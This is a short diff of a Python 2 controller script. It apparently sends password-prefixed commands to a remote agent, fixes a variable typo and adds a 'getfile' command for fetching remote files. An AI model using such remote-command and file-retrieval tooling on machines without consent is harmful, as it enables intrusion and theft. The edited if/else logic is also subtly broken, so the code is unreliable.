@@ -35,8 +35,11 @@ def main():
     while 1:
         command = raw_input("Command to send:")
         if command == 'watchfile':
-            watch_patch = raw_input("Path to watch:")
-            command = PASSWORD + "1" + watch_patch
+            watch_path = raw_input("Path to watch:")
+            command = PASSWORD + "1" + watch_path
+        if command == 'getfile':
+            file_path = raw_input("File to get")
+            command = PASSWORD + "2" + file_path
         else:
             command = PASSWORD +"0" + command
 
